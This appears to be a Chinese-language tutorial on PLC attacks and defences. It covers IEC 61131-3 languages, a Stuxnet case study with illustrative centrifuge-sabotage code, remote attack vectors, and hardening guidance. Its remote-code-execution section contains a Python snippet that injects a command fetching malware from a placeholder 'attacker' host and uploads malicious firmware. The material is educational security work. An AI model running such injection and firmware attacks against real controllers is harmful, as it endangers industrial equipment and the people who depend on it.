# PLC攻击与防护

## PLC基础

可编程逻辑控制器（PLC）是工业自动化系统的核心控制设备。PLC采用IEC 61131-3标准的编程语言，包括：

| 编程语言 | 特点 | 适用场景 |
|---------|------|---------|
| Ladder Logic（梯形图） | 继电器逻辑可视化 | 离散控制 |
| Structured Text（ST） | 类似Pascal的文本语言 | 复杂算法 |
| Function Block Diagram（FBD） | 图形化函数组合 | 过程控制 |
| Instruction List（IL） | 汇编风格 | 简单逻辑 |
| Sequential Function Chart（SFC） | 状态机 | 批处理流程 |

Ladder Logic示例（电机启停控制）：

```
  ||---[ ]----[ ]----( )----|
  |  START   STOP   MOTOR  |
  |    |                    |
  |    |---[MOTOR]----------|
```

ST语言示例（PID控制）：

```pascal
PROGRAM PID_Control
VAR
    setpoint : REAL := 100.0;
    process_var : REAL;
    output : REAL;
    Kp : REAL := 2.0;
    Ki : REAL := 0.5;
    Kd : REAL := 0.1;
    error : REAL;
    integral : REAL := 0.0;
    derivative : REAL;
    prev_error : REAL := 0.0;
END_VAR

error := setpoint - process_var;
integral := integral + error * 0.1;
derivative := (error - prev_error) / 0.1;
output := Kp * error + Ki * integral + Kd * derivative;
prev_error := error;

IF output > 100.0 THEN
    output := 100.0;
ELSIF output < 0.0 THEN
    output := 0.0;
END_IF;
END_PROGRAM
```

## Stuxnet案例深度分析

### 背景

Stuxnet（震网）是世界上已知最早的针对工业控制系统的网络武器，2010年被发现，据信由美国与以色列联合开发。它攻击了伊朗纳坦兹铀浓缩设施的离心机。

### 攻击链

| 阶段 | 描述 |
|------|------|
| 初始感染 | 通过USB驱动器利用LNK漏洞（CVE-2010-2568）传播 |
| 提权 | 使用被盗的RealTek/JMicron签名证书加载驱动 |
| 横向移动 | 通过Windows网络传播，利用MS10-061打印漏洞 |
| 到达目标 | 识别并连接西门子Step7工程站的Profibus网络 |
| 攻击执行 | 修改Step7项目，向PLC发送恶意指令 |
| 物理破坏 | 篡改离心机变频器频率，造成物理损坏 |

### 技术细节

**驱动签名绕过**：Stuxnet使用了从RealTek公司窃取的有效数字证书签名的驱动。这使其能够在内核层运行而不触发Windows的警告。

**Step7项目篡改**：Stuxnet在感染Step7工程站后，拦截PLC与工程站之间的Profibus通信。当操作员在工程站上查看梯形图时，显示的是正常代码；但实际发送到PLC的是恶意代码。

```pascal
// Stuxnet在Step7中拦截的典型函数块逻辑
// 正常显示给操作员的逻辑:
IF (Centrifuge_Speed > 0) THEN
    Monitor_Alarm := FALSE;
END_IF;

// 实际写入选用的恶意逻辑:
IF (Centrifuge_ID >= 1 AND Centrifuge_ID <= 984) THEN
    // 将变频器频率在1064Hz和10Hz之间交替
    IF (Cycle_Count MOD 2 = 0) THEN
        Frequency_Setpoint := 1064;  // 超速
    ELSE
        Frequency_Setpoint := 10;    // 减速
    END_IF;
    // 记录虚假的正常运行数据
    Centrifuge_Speed := 630;  // 伪造正常速度
    Cycle_Count := Cycle_Count + 1;
END_IF;
```

**攻击效果**：

1. 首先将离心机转速提升至额定值以上（1064Hz），持续15分钟
2. 然后将转速骤降至极低水平（10Hz），持续50分钟
3. 反复循环，导致离心机铝管疲劳破裂
4. 同时向监控系统报告虚假的正常运行数据
5. 据估计摧毁了伊朗约1000台离心机（约20%）

## 远程PLC攻击

### 攻击向量

现代PLC面临的远程攻击向量包括：

| 向量 | 描述 | 案例 |
|------|------|------|
| 未认证Web接口 | PLC内置Web服务器无认证 | Siemens S7-1200旧固件 |
| 默认密码 | 厂商出厂密码未修改 | Schneider默认密码 |
| 协议漏洞 | Modbus/DNP3协议漏洞 | EtherNet/IP DoS |
| 固件后门 | 植入恶意固件 | 固件仿冒 |
| 供应链污染 | 开发工具被感染 | Sabotaged Step7 |

### 远程代码执行

攻击者获得PLC远程代码执行权限的过程：

```python
# 利用未认证PLC Web接口
import requests

# 1. 扫描PLC Web接口
target = "http://192.168.1.100"
response = requests.get(f"{target}/")

# 2. 利用命令注入（如果存在CGI调试接口）
payload = "127.0.0.1; wget http://attacker/malware -O /tmp/malware"
requests.post(f"{target}/cgi-bin/diag.cgi", data={"ping": payload})

# 3. 上传恶意固件
requests.post(f"{target}/fwupload",
             files={"firmware": open("malicious_firmware.bin", "rb")})
```

## 安全加固

### 基本安全配置

```
1. 禁用未使用的服务
   - HTTP/HTTPS 管理接口（仅本地维护时启用）
   - FTP/TFTP 文件传输
   - SNMP v1/v2c（仅使用v3）
   - Telnet（使用SSH替代）

2. 修改出厂默认密码
   - Siemens: 无密码 → 强密码
   - Schneider: USER/PASSWORD → 修改
   - Rockwell: 空密码 → 修改
   - Mitsubishi: admin/admin → 修改

3. 固件完整性管理
   - 仅从官方渠道获取固件
   - 验证固件数字签名
   - 维护固件版本清单
```

### Purdue模型

在网络层面按照Purdue模型实施隔离：

```
Level 3 (运营管理) ── [工业防火墙] ── Level 2 (区域监控)
                                              |
                                        [工业防火墙]
                                              |
Level 1 (基本控制 - PLC/RTU) ── [网闸/单向网关] ── Level 0 (现场设备)
```

关键隔离原则：

1. IT与OT网络之间必须部署DMZ
2. OT网络禁止直接访问互联网
3. PLC所在Level 1与Level 2之间使用工业防火墙
4. 远程维护通过跳板机（Bastion Host）进行

### 日志与监控

PLC安全需要持续的日志记录和监控：

```python
# Syslog配置示例（PLC通过Syslog发送事件）
import logging
import logging.handlers

syslog_handler = logging.handlers.SysLogHandler(
    address=('10.0.1.100', 514)
)

logger = logging.getLogger('PLC_Monitor')
logger.addHandler(syslog_handler)

# 监控事件类型
events = [
    ("PLC_START", "PLC控制器启动"),
    ("PLC_STOP", "PLC控制器停止"),
    ("LOGIN_SUCCESS", "登录成功"),
    ("LOGIN_FAILURE", "登录失败"),
    ("CONFIG_CHANGE", "配置变更"),
    ("FW_UPDATE", "固件更新"),
    ("PROG_UPLOAD", "程序上传"),
    ("ALARM_TRIGGER", "报警触发"),
]
```

## Safety vs Security

| 维度 | Safety（功能安全） | Security（信息安全） |
|------|-------------------|---------------------|
| 目标 | 防止事故造成人身伤害 | 防止恶意攻击 |
| 威胁模型 | 随机故障、环境因素 | 定向攻击者 |
| 标准 | IEC 61508, ISO 13849 | IEC 62443 |
| 措施 | 冗余、看门狗、急停 | 防火墙、加密、认证 |
| 挑战 | 功能安全与安全性冲突 | 安全补丁影响系统可用性 |

关键挑战：Safety系统需要安全隔离，但许多Safety组件缺乏Security控制。例如安全PLC的Safety通信协议通常未加密，如果攻击者能够物理访问安全总线，可以绕过Safety逻辑。

## 总结

PLC攻击从Stuxnet的标志性案例发展到今天已成为常规威胁。防护需要从固件完整性、网络隔离、访问控制和持续监控四个维度构建。特别重要的是理解功能安全与信息安全之间的平衡——安全措施不应影响PLC的实时控制能力，但也不能因此忽视基本的安全防护。
